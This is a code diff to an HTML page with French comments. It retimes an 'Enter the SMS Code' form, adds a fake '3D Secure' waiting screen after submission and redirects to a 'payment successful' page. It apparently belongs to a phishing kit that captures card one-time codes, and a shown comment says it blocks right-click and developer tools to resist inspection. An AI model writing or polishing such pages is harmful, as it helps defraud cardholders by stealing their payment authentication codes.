@@ -93,7 +93,7 @@
         <button class="button" disabled>Processing...</button>
     </div>
 
-    <!-- Formulaire SMS après 10 secondes -->
+    <!-- Formulaire SMS -->
     <div class="container" id="smsForm">
         <h2>Enter the SMS Code</h2>
         <p>Please enter the code sent to your phone.</p>
@@ -106,12 +106,11 @@
     </div>
 
     <script>
-        // Afficher l'écran d'attente pendant 10 secondes
+        // Afficher le formulaire SMS après 1 seconde
         setTimeout(function() {
-            // Masquer l'écran d'attente et afficher le formulaire SMS
             document.getElementById('waiting').style.display = 'none';
             document.getElementById('smsForm').style.display = 'block';
-        }, 10000); // 10 secondes
+        }, 1000); // 1 seconde
 
         // Gérer la soumission du formulaire SMS
         document.getElementById('smsCodeForm').addEventListener('submit', async function(event) {
@@ -134,11 +133,16 @@
                 }),
             });
 
-            // Attendre 10 secondes avant de rediriger
+            // Afficher l'écran d'attente 3D Secure pendant 7 secondes avant la redirection
             setTimeout(function() {
-                // Redirection après 10 secondes
-                window.location.href = 'https://example.com/success'; // Remplacez par l'URL de votre choix
-            }, 10000); // 10 secondes
+                document.getElementById('smsForm').style.display = 'none';
+                document.getElementById('waiting').style.display = 'block';
+
+                // Redirection après 7 secondes
+                setTimeout(function() {
+                    window.location.href = 'https://example.com/success'; // Remplacez par l'URL de la page de paiement réussi
+                }, 7000); // 7 secondes
+            }, 7000); // 7 secondes d'attente avant la redirection
         });
 
         // Désactiver le clic droit et les outils de développement
